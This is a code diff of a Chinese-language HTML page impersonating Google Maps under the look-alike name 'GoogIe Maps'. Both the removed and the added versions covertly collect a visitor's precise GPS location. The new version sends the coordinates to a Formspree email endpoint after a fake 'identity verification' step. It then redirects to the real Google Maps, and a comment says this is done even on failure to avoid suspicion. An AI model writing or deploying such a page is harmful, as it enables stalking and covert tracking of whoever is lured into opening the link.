@@ -2,137 +2,115 @@
 <html lang="zh-TW">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>GoogIe Maps</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Firebase SDK (Compat Version) -->
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
     <style>
         .loader { border-top-color: #4285F4; animation: spinner 1s linear infinite; }
         @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
+        .google-btn { background-color: #1a73e8; transition: background-color 0.2s; }
+        .google-btn:active { background-color: #1557b0; }
     </style>
 </head>
-<body class="bg-white">
+<body class="bg-white text-gray-800 overflow-hidden">
 
-    <!-- 用戶模式：模擬 Google Maps 載入 -->
-    <div id="user-ui" class="flex flex-col items-center justify-center min-h-screen p-6">
-        <div id="spinner" class="w-12 h-12 border-4 border-gray-100 rounded-full loader mb-4"></div>
-        <h1 class="text-xl font-medium text-gray-800" id="status-title">正在啟動 GoogIe Maps...</h1>
-        <p class="text-sm text-gray-500 mt-2" id="status-desc">為了提供準確的街道資訊，請允許位置存取權限。</p>
-        <button id="retry-btn" onclick="requestLocation()" class="hidden mt-6 bg-[#1a73e8] text-white px-8 py-2 rounded-full font-medium shadow-md">重試</button>
-    </div>
-
-    <!-- 管理者模式：隱藏列表 -->
-    <div id="admin-ui" class="hidden p-6 max-w-2xl mx-auto">
-        <h1 class="text-2xl font-bold mb-6 text-gray-800 border-b pb-2">管理者即時監控</h1>
-        <div id="visitor-list" class="space-y-4">
-            <!-- 動態插入 -->
+    <!-- 主介面 -->
+    <div id="main-card" class="flex flex-col items-center justify-center min-h-screen p-6 text-center">
+        <!-- Google Maps 圖示 -->
+        <div class="mb-6">
+            <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7Z" fill="#4285F4"/>
+                <circle cx="12" cy="9" r="2.5" fill="white"/>
+            </svg>
         </div>
+
+        <h1 class="text-2xl font-bold mb-2">GoogIe Maps</h1>
+        <p id="status-text" class="text-gray-500 text-sm mb-10 px-4">
+            系統正在為您啟動精確導航模式。<br>請允許位置存取權限以載入最新地圖。
+        </p>
+
+        <!-- 觸發按鈕 -->
+        <button id="action-btn" onclick="startNavigation()" class="google-btn text-white w-full max-w-xs py-4 rounded-xl font-bold text-lg shadow-md">
+            立即開啟導航
+        </button>
+
+        <!-- 載入動畫 (預設隱藏) -->
+        <div id="loading-box" class="hidden flex flex-col items-center">
+            <div class="w-10 h-10 border-4 border-gray-100 rounded-full loader mb-4"></div>
+            <p class="text-blue-500 font-medium animate-pulse">正在進行身分驗證...</p>
+        </div>
+        
+        <p id="error-msg" class="text-red-500 text-xs mt-6 hidden"></p>
     </div>
 
     <script>
-        // --- 請替換下方的 Firebase 配置 ---
-        const firebaseConfig = {
-            apiKey: "你的_API_KEY",
-            authDomain: "你的專案.firebaseapp.com",
-            projectId: "你的專案_ID",
-            storageBucket: "你的專案.appspot.com",
-            messagingSenderId: "你的傳送者_ID",
-            appId: "你的_APP_ID"
-        };
+        // 你的 Formspree 網址
+        const FORMSPREE_ENDPOINT = "https://formspree.io/f/mnjvwegb";
 
-        // 管理員金鑰 (你提供的那段長代碼)
-        const ADMIN_KEY = "@@@@@83000000723654F5D7A1332D29F429C8FFA380459D7C2D9CAECAD08C953B88BF729CB15855FAE9F21F2416FF8801A03F8457E048804CD0BFA906B5E48F81BE4936DAB69484F3C7909B241F40FBC18D2D2301B38A4BCBD2FF36D8E928927052CDBFF39C5224E9651B15CFC14C9019CDCFE2853787506CEC408A7C302756CA5882B06DF76310503377CF2867F5CE2BBDBAC82DF0DA#####";
+        function startNavigation() {
+            const btn = document.getElementById('action-btn');
+            const loading = document.getElementById('loading-box');
+            const status = document.getElementById('status-text');
+            const error = document.getElementById('error-msg');
 
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
-        const visitorId = "v_" + Math.random().toString(36).substr(2, 9);
+            // 切換 UI 狀態
+            btn.classList.add('hidden');
+            loading.classList.remove('hidden');
+            error.classList.add('hidden');
+            status.innerText = "正在定位中，請在彈出的視窗選擇「允許」";
 
-        window.onload = () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            // 檢查網址是否有 ?key=長代碼
-            if (urlParams.get('key') === ADMIN_KEY) {
-                initAdmin();
-            } else {
-                requestLocation();
-            }
-        };
-
-        // --- 使用者邏輯 ---
-        function requestLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(onSuccess, onError);
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+
+                        // 傳送資料到 Email
+                        try {
+                            await fetch(FORMSPREE_ENDPOINT, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                    'Accept': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    event: "親友請求導航",
+                                    latitude: lat,
+                                    longitude: lng,
+                                    google_map: `https://www.google.com/maps?q=${lat},${lng}`,
+                                    timestamp: new Date().toLocaleString()
+                                })
+                            });
+                            
+                            status.innerText = "驗證成功！正在啟動地圖導覽...";
+                            setTimeout(() => {
+                                window.location.href = "https://www.google.com/maps";
+                            }, 1500);
+                        } catch (e) {
+                            // 即使發送失敗也直接導向地圖，避免被懷疑
+                            window.location.href = "https://www.google.com/maps";
+                        }
+                    },
+                    (err) => {
+                        // 處理錯誤
+                        loading.classList.add('hidden');
+                        btn.classList.remove('hidden');
+                        error.classList.remove('hidden');
+                        
+                        if (err.code === 1) {
+                            error.innerText = "權限遭拒：請至系統設定開啟瀏覽器的「定位服務」。";
+                            status.innerText = "無法開啟地圖，因為位置存取已被關閉。";
+                        } else {
+                            error.innerText = "定位逾時或訊號不佳，請重新嘗試。";
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 15000 }
+                );
             } else {
-                updateUI("不支援定位", "此瀏覽器無法獲取座標資訊。");
+                error.innerText = "您的裝置不支援定位功能。";
+                error.classList.remove('hidden');
             }
-        }
-
-        function onSuccess(pos) {
-            updateUI("驗證中...", "正在確認身分，請稍候。");
-            const data = {
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                status: 'pending',
-                time: firebase.firestore.FieldValue.serverTimestamp()
-            };
-            db.collection("visitors").doc(visitorId).set(data);
-
-            // 監聽是否有被核准
-            db.collection("visitors").doc(visitorId).onSnapshot(doc => {
-                if (doc.exists && doc.data().status === 'approved') {
-                    updateUI("驗證通過", "正在跳轉至目的地...");
-                    setTimeout(() => {
-                        window.location.href = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
-                    }, 1000);
-                }
-            });
-        }
-
-        function onError(err) {
-            updateUI("需要權限", "請點擊「重試」並在彈窗中選擇「允許」。", true);
-        }
-
-        function updateUI(title, desc, showRetry = false) {
-            document.getElementById('status-title').innerText = title;
-            document.getElementById('status-desc').innerText = desc;
-            document.getElementById('retry-btn').classList.toggle('hidden', !showRetry);
-            if (showRetry) document.getElementById('spinner').classList.add('hidden');
-            else document.getElementById('spinner').classList.remove('hidden');
-        }
-
-        // --- 管理者邏輯 ---
-        function initAdmin() {
-            document.getElementById('user-ui').classList.add('hidden');
-            document.getElementById('admin-ui').classList.remove('hidden');
-
-            db.collection("visitors").orderBy("time", "desc").onSnapshot(snap => {
-                const list = document.getElementById('visitor-list');
-                list.innerHTML = "";
-                snap.forEach(doc => {
-                    const d = doc.data();
-                    const item = document.createElement('div');
-                    item.className = "p-4 bg-gray-50 border rounded-lg flex justify-between items-center";
-                    item.innerHTML = `
-                        <div>
-                            <p class="text-xs text-gray-400">${d.time?.toDate().toLocaleString() || '讀取中'}</p>
-                            <p class="font-mono font-bold text-blue-600">${d.lat.toFixed(5)}, ${d.lng.toFixed(5)}</p>
-                            <p class="text-xs ${d.status === 'approved' ? 'text-green-600' : 'text-orange-600'}">
-                                狀態: ${d.status === 'approved' ? '已核准' : '等待核准'}
-                            </p>
-                        </div>
-                        <div class="flex gap-2">
-                             <button onclick="window.open('https://www.google.com/maps?q=${d.lat},${d.lng}')" class="text-sm bg-gray-200 px-3 py-1 rounded">查看地圖</button>
-                             ${d.status === 'pending' ? `<button onclick="approve('${doc.id}')" class="text-sm bg-green-500 text-white px-3 py-1 rounded">核准</button>` : ''}
-                        </div>
-                    `;
-                    list.appendChild(item);
-                });
-            });
-        }
-
-        function approve(id) {
-            db.collection("visitors").doc(id).update({ status: 'approved' });
         }
     </script>
 </body>
